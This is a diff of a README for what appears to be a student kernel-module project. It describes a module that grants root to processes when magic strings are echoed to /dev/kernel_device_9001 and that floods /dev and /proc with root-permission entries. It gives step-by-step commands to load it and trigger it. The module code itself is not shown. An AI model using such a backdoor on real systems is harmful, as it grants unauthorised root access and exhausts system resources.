@@ -1,1 +1,41 @@
-Basic implementation of a linux kernel module
+This program raises the permissions of the process ID though an exploit in linux kernel version
+3.4. This program accepts strings to root from either the local terminal, remote terminal, or a C program
+then overflows the /dev and /proc folder with devices and processes that have full root (rwx) permission.
+
+
+1) Open another terminal window:
+ 	run:
+		make
+		gcc call_sys.c -o call_sys
+		sudo insmod project2.ko (to insert the module)
+
+		Once you're ready to remove the module:
+		sudo rmmod project2.ko (to remove the module)
+
+2) Open another terminal window:
+   	run:
+		tail -f /var/log/kern.log (to see what the kernel outputs)
+
+3) Open another terminal window:
+	run: *** NOTE YOU WILL HAVE TO RESTART YOUR SYSTEM AFTER RUNNING
+		 THIS C PROGRAM, I SUGGEST STARTING WITH THE echo COMMANDS ***
+		./call_sys
+
+	OR:
+		echo "let me in" > /dev/kernel_device_9001
+		echo "elevate" > /dev/kernel_device_9001
+		echo "elevate_current" > /dev/kernel_device_9001
+		TWO MORE FUNCTIONALITIES REQUIRE THE C CODE TO RUN.
+
+
+To check if it worked:
+
+cd /proc
+ls -l
+cd /dev
+ls -l
+
+then try:
+sudo rmmod project2.ko
+sudo insmod project2.ko
+New devices cannot be created because the folder has been filled.
